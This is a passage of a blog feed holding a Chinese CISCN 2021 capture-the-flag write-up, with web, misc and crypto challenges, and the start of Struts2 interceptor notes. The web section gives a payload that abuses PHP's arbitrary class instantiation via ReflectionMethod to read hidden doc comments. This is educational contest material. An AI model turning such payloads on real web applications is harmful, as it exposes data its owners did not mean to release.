class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs php">本题目没有其他代码了噢，就只有这一个文件，虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$c</span> = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">c</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">d</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">e</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">g</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">h</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">i</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">j</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">k</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">l</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">m</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">n</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">o</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">p</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">q</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">r</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">s</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">t</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <br>&#125;<br><br><span class="hljs-variable">$rc</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;rc&quot;</span>];<br><span class="hljs-variable">$rb</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;rb&quot;</span>];<br><span class="hljs-variable">$ra</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;ra&quot;</span>];<br><span class="hljs-variable">$rd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;rd&quot;</span>];<br><span class="hljs-variable">$method</span>= <span class="hljs-keyword">new</span> <span class="hljs-variable">$rc</span>(<span class="hljs-variable">$ra</span>, <span class="hljs-variable">$rb</span>);<br>var_dump(<span class="hljs-variable">$method</span>-&gt;<span class="hljs-variable">$rd</span>());<br></code></pre></td></tr></table></figure><p>根据提示，本题就这一个文件，而且提示看到的不完全，猜测 flag被注释了，而且在类中被注释了。</p><p>需要GET提交四个参数，可以实例化任意类，并调用类方法。利用 PHP内置类中的 ReflectionMethod 来读取 User 类里面各个函数的注释</p><p>本地测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$c</span> = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//pubLic $b = 100;</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Increment counter</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@final</span></span><br><span class="hljs-comment"> * <span class="hljs-doctag">@static</span></span><br><span class="hljs-comment"> * <span class="hljs-doctag">@access</span>  publicCISCN&#123;test&#125;</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span>  int</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>&#125;<br>&#125;<br><span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> ReflectionMethod(<span class="hljs-string">&#x27;User&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>);<br>var_dump(<span class="hljs-variable">$d</span>-&gt;getDocComment());<br><br></code></pre></td></tr></table></figure><p>运行结果如下：<br><img src="https://img-blog.csdnimg.cn/20210516141112739.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>源码中有26个函数，flag在某个函数的注释中，构造Payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment<br></code></pre></td></tr></table></figure><p>抓包，爆破rb参数的值，从a-z开始爆破，最终在q的注释中找到flag<br><img src="https://img-blog.csdnimg.cn/20210516141137899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="running-pixel"><a href="#running-pixel" class="headerlink" title="running_pixel"></a>running_pixel</h2><p>使用脚本进行gif分帧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>file_name = <span class="hljs-string">&#x27;running_pixel.gif&#x27;</span><br><span class="hljs-comment"># 使用Image模块的open()方法打开gif动态图像时，默认是第一帧</span><br>im = Image.<span class="hljs-built_in">open</span>(file_name)<br><span class="hljs-comment"># 定义存储图片的文件名与读取的GIF图片名一致</span><br>file_save = file_name[:-<span class="hljs-number">4</span>]<br><span class="hljs-comment"># 在同级目录下创建存放每帧图片的文件夹</span><br><span class="hljs-comment"># 创建一级目录：os.mkdir(&#x27;D:\\gif1&#x27;)   创建多级目录：os.makedirs(&#x27;D:\\gif1\\gif1&#x27;)</span><br>os.mkdir(file_save)<br><span class="hljs-keyword">try</span>:<br>  <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-comment"># 保存当前帧图片</span><br>    <span class="hljs-comment"># 获取当前文件的位置(GIF图的帧数)</span><br>    frame_number= im.tell()<br>    <span class="hljs-comment"># 保存图片，格式为png</span><br>    im.save(file_save+<span class="hljs-string">&#x27;/&#x27;</span>+<span class="hljs-built_in">str</span>(frame_number)+<span class="hljs-string">&#x27;.png&#x27;</span>)<br>    <span class="hljs-comment"># 获取下一帧图片</span><br>    im.seek(frame_number+<span class="hljs-number">1</span>)<br><span class="hljs-keyword">except</span> EOFError:<br>    <span class="hljs-keyword">pass</span><br>print(<span class="hljs-string">&quot;共:&quot;</span>, frame_number, <span class="hljs-string">&quot;张图片&quot;</span>)<br></code></pre></td></tr></table></figure><p>参考<a href="https://mochu.blog.csdn.net/article/details/116855242">末初</a>师傅的wp</p><p>PS打开打开几张图片查看，有可疑白点，像素块为<code>RGB: (233,233,233)</code>，其他图片中也发现了这个像素块<br><img src="https://img-blog.csdnimg.cn/20210521203038633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提取382张图片的像素块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>flag_img = Image.new(<span class="hljs-string">&#x27;1&#x27;</span>,(<span class="hljs-number">400</span>,<span class="hljs-number">400</span>))<br><span class="hljs-comment">#mode=1 1位黑白像素，每字节存储一个像素</span><br><span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">381</span>):<br>    framepic = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;./running_pixel/<span class="hljs-subst">&#123;name&#125;</span>.png&quot;</span>)<br>    framepic = framepic.convert(<span class="hljs-string">&quot;RGB&quot;</span>)<br>    width,height = framepic.size<br>    <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>        <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>            <span class="hljs-keyword">if</span> framepic.getpixel((w,h)) == (<span class="hljs-number">233</span>,<span class="hljs-number">233</span>,<span class="hljs-number">233</span>):<br>                flag_img.putpixel((h,w),<span class="hljs-number">1</span>)<br><br>    flag_img.save(<span class="hljs-string">f&quot;flag_<span class="hljs-subst">&#123;name&#125;</span>.png&quot;</span>)<br></code></pre></td></tr></table></figure><p>最后一张图<br><img src="https://img-blog.csdnimg.cn/2021052120570322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>根据字符出现顺序得到：12504D0F-9DE1-4B00-87A5-A5FDD0986A00<br>最终flag为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CISCN&#123;12504d0f-9de1-4b00-87a5-a5fdd0986a00&#125;<br></code></pre></td></tr></table></figure><h2 id="tiny-traffic"><a href="#tiny-traffic" class="headerlink" title="tiny traffic"></a>tiny traffic</h2><p>流量包拖入wirkshark中，导出http对象，发现了两个gzip和两个br文件<br><img src="https://img-blog.csdnimg.cn/20210521211621458.png" alt="在这里插入图片描述"><br>解压flag_wrapper得到…<br><img src="https://img-blog.csdnimg.cn/20210521211307860.png" alt="在这里插入图片描述"><br>把test后缀改为br，解压得到test：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">syntax = <span class="hljs-string">&quot;proto3&quot;</span>;<br><br>message PBResponse &#123;<br>  int32 code = 1;<br>  int64 flag_part_convert_to_hex_plz = 2;<br>  message data &#123;<br>    string junk_data = 2;<br>    string flag_part = 1;<br>  &#125;<br>  repeated data dataList = 3;<br>  int32 flag_part_plz_convert_to_hex = 4;<br>  string flag_last_part = 5;<br>&#125;<br><br>message PBRequest &#123;<br>  string cate_id = 1;<br>  int32 page = 2;<br>  int32 pageSize = 3;<br>&#125;<br></code></pre></td></tr></table></figure><p>下载解压后进入到bin目录，将之前解压出来的test改为test.proto并移动到bin目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.\protoc.exe --python_out=. test.proto<br></code></pre></td></tr></table></figure><p>得到test_pb2.py，把解压后的secret也移动到bin目录<br><img src="https://img-blog.csdnimg.cn/20210521225101522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>反序列化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">import test_pb2<br><br>with open(<span class="hljs-string">&#x27;./secret&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) as f:<br>    data = f.read()<br>    target = test_pb2.PBResponse()<br>    target.ParseFromString(data)<br>    <span class="hljs-built_in">print</span>(target)<br></code></pre></td></tr></table></figure><p>运行脚本得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">code: 200<br>flag_part_convert_to_hex_plz: 15100450<br>dataList &#123;<br>  flag_part: <span class="hljs-string">&quot;e2345&quot;</span><br>  junk_data: <span class="hljs-string">&quot;7af2c&quot;</span><br>&#125;<br>dataList &#123;<br>  flag_part: <span class="hljs-string">&quot;7889b0&quot;</span><br>  junk_data: <span class="hljs-string">&quot;82bc0&quot;</span><br>&#125;<br>flag_part_plz_convert_to_hex: 16453958<br>flag_last_part: <span class="hljs-string">&quot;d172a38dc&quot;</span><br></code></pre></td></tr></table></figure><p>把15100450和16453958转换为hex，和其他hex按顺序拼接得到最终flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CISCN&#123;e66a22e23457889b0fb1146d172a38dc&#125;<br></code></pre></td></tr></table></figure><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="classic"><a href="#classic" class="headerlink" title="classic"></a>classic</h2><p>附件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">AXAXDFDXXAFADFGFXAADFGDXGFDXFFDFAXDXFFFFXGXGAAXAGAFDDXFFDXFFDXDXDXDXGFDFAXFXAADXAAGAXGDGXAXAFAXXFFXADFFGAADXDXAXDFDFDXXAXXDXDAAAAAFAXAAAFGGAFGFGXADXXADFGADXDFDFGAGFDGAXFGAXDGDADXFFFFDAGFADXGDX<br></code></pre></td></tr></table></figure><p><a href="https://wishingstarmoye.com/ctf/adfgx">ADFGX密码</a>，用最经典的密码表<code>phqgmeaynofdxkrcvszwbutil</code>，key为题目名字<code>classic</code>，最可气的是解密时需要将附件中的内容反转得到密文：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">str=<span class="hljs-string">&quot;AXAXDFDXXAFADFGFXAADFGDXGFDXFFDFAXDXFFFFXGXGAAXAGAFDDXFFDXFFDXDXDXDXGFDFAXFXAADXAAGAXGDGXAXAFAXXFFXADFFGAADXDXAXDFDFDXXAXXDXDAAAAAFAXAAAFGGAFGFGXADXXADFGADXDFDFGAGFDGAXFGAXDGDADXFFFFDAGFADXGDX&quot;</span><br><span class="hljs-built_in">print</span>(str[::-1])<br><br><span class="hljs-comment">#XDGXDAFGADFFFFXDADGDXAGFXAGDFGAGFDFDXDAGFDAXXDAXGFGFAGGFAAAXAFAAAAADXDXXAXXDFDFDXAXDXDAAGFFDAXFFXXAFAXAXGDGXAGAAXDAAXFXAFDFGXDXDXDXDFFXDFFXDDFAGAXAAGXGXFFFFXDXAFDFFXDFGXDGFDAAXFGFDAFAXXDFDXAXA</span><br></code></pre></td></tr></table></figure><p>然后再解密得到flag，大意了<br><img src="https://img-blog.csdnimg.cn/20210521214939316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
      
      
    <summary type="html"> &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h1 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h1&gt;&lt;h2 id=&quot;esay-sql&quot;&gt;&lt;a href=&quot;#esay-sql&quot; class=&quot;head</summary>
      
    
    
    
    <category term="CTF" scheme="http://atkx.top/categories/CTF/"/>
    
    <category term="比赛复现" scheme="http://atkx.top/categories/CTF/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Write up" scheme="http://atkx.top/tags/Write-up/"/>
    
  </entry>
  
  <entry>
    <title>Struts2之拦截器</title>
    <link href="http://atkx.top/2021/04/25/Struts2%E6%8B%A6%E6%88%AA%E5%99%A8/"/>
    <id>http://atkx.top/2021/04/25/Struts2%E6%8B%A6%E6%88%AA%E5%99%A8/</id>
    <published>2021-04-25T08:16:03.000Z</published>
    <updated>2021-08-15T03:59:06.561Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：Struts2框架学习笔记（三）</p> <a id="more"></a><h2 id="拦截器简介"><a href="#拦截器简介" class="headerlink" title="拦截器简介"></a>拦截器简介</h2><p>   拦截器（Interceptor）是Struts2的核心组成部分，它可以动态拦截Action调用的对象，类似于Servlet中的过滤器。 Struts2的拦截器是AOP（Aspect-Object-Programming，面向切面编程）的一种实现策略，是可插拔的。它可以任意地组合Action提供的附加功能，而不需要修改Action的代码，开发者只需要提供拦截器的实现类，并将其配置在struts.xml中即可。</p><p>每个拦截器可以完成单个功能。不同功能的拦截器按照一定的顺序排列在一起形成的链，就是拦截器链。拦截器链组成的集合就是拦截器栈。</p><h2 id="拦截器配置"><a href="#拦截器配置" class="headerlink" title="拦截器配置"></a>拦截器配置</h2><p><strong>1.拦截器</strong><br>要想拦截器起作用，首先要在struts.xml文件中进行配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptorName&quot;</span>   <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;interceptorClass&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;paramName&quot;</span>&gt;</span>paramValue<span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">interceptor</span>&gt;</span><br></code></pre></td></tr></table></figure><p>name属性用来指定拦截器的名称，class属性用于指定拦截器的实现类。如果在定义拦截器时需要传入参数，这时需要使用<code>&lt;param&gt;</code>标签,其中name属性用来指定参数的名称，paramValue表示参数的值。</p><p><strong>2.拦截栈</strong><br>在实际开发中，经常需要在Action执行前同时执行多个拦截动作，如用户登录检查、登录日志记录以及权限检查等，这时，可以把多个拦截器组成一个拦截器栈。<br>在使用时，可以将栈内的多个拦截器当成个整体来引用。 当拦截器栈被附加到一个 Action上时，在执行Action之前必须先执行拦截器栈中的每一一 个拦截器。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">interceptors</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptorStackName&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptorName&quot;</span> /&gt;</span><br>        ...<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">interceptors</span>&gt;</span><br></code></pre></td></tr></table></figure><p>interceptorStackName值代表配置的拦截器栈的名称，interceptorName值代表拦截器的名称。</p><p>除此之外，一个拦截器栈也可以包含另外一个拦截器栈：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;xxx&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span> &gt;</span><br>    <span class="hljs-comment">&lt;!--声明拦截器--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptors</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptor1&quot;</span>   <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;interceptorClass&quot;</span>/&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptor2&quot;</span>   <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;interceptorClass&quot;</span>/&gt;</span><br> <span 